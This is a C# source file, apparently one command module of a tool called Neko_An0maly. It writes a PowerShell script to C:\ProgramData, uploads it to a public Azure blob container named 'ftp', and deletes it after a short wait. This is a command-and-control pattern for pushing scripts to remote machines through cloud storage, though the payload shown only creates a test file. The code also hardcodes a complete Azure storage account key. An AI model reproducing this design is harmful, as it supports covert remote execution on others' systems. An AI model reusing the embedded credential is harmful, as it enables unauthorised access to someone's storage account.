using System;
using System.IO;
using System.Text;
using Microsoft.WindowsAzure.Storage;
using Microsoft.WindowsAzure.Storage.Blob;
using System.Threading;

namespace Neko_An0maly.Commands
{
    public class Test : Command
    {
        public static string path = @"C:\ProgramData\";
        public Test(string name) : base(name) { }

        public override string execute(string[] args)
        {
            if (args.Length == 1)
            {
                Console.WriteLine("Initializing command to be sent.");

                string fileName = args[0] + ".ps1";
                string finalPath = path + fileName;
                using (FileStream fs = File.Create(finalPath))
                {
                    Byte[] line1 = new UTF8Encoding(true).GetBytes(@"New-Item C:\ProgramData\testing.txt");
                    fs.Write(line1, 0, line1.Length);
                }

                Console.WriteLine("Initializing upload.");

                upload(finalPath);
                return "";
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Invalid arguments for 'test'. Requires 1 argument(s).");
                Console.ForegroundColor = ConsoleColor.White;
                return "Invalid arguments for 'test'. Requires 1 argument(s).";
            }
        }

        public void upload(string fileToUpload)
        {
            string file_extension,
            filename_withExtension,
            storageAccount_connectionString;
            Stream file;
            string azure_ContainerName = "ftp";

            storageAccount_connectionString = "DefaultEndpointsProtocol=https;AccountName=previewps;AccountKey=Io326GO+TGJpd8yBh1LzSDDRc6vdWV81O6Ntkc/SJOYHe4NA6IlxUOPrJjycEM8uAEWZu2XkZ5LUDTymfRGIsw==;EndpointSuffix=core.windows.net"; ;

            file = new FileStream(fileToUpload, FileMode.Open);

            CloudStorageAccount mycloudStorageAccount = CloudStorageAccount.Parse(storageAccount_connectionString);
            CloudBlobClient blobClient = mycloudStorageAccount.CreateCloudBlobClient();
            CloudBlobContainer container = blobClient.GetContainerReference(azure_ContainerName);

            if (container.CreateIfNotExists())
            {

                container.SetPermissionsAsync(new BlobContainerPermissions
                {
                    PublicAccess =
                  BlobContainerPublicAccessType.Blob
                });

            }

            file_extension = Path.GetExtension(fileToUpload);
            filename_withExtension = Path.GetFileName(fileToUpload);

            CloudBlockBlob cloudBlockBlob = container.GetBlockBlobReference(filename_withExtension);
            cloudBlockBlob.Properties.ContentType = file_extension;

            cloudBlockBlob.UploadFromStreamAsync(file);

            Console.WriteLine("Upload Completed.");
            Console.WriteLine("Thread sleeping for 6s.");

            Thread.Sleep(6000);

            Console.WriteLine("Deleting command to prevent looping.");
            cloudBlockBlob.DeleteIfExists();
            file.Dispose();
        }
    }
}
